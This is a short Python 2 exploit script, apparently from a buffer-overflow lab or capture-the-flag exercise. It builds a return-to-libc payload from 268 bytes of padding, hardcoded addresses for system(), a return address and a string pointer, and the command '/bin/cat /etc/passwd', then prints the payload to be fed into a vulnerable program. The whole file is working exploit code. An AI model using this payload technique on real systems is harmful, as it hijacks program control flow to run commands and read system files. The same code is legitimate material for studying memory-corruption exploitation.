#import sys
# overflow + addr of system + retaddr of system + addr of string + actual string

exploit = b"A"*(268) + b"\xb0\x5d\xe4\xf7" + b"\xe0\x99\xe3\xf7" + b"\xa9\xd8\xff\xff" + b"\x01"  + b"/bin/cat /etc/passwd\x00"
print exploit

#payload = bytearray(exploit)

#sys.stdout.buffer.write(payload)

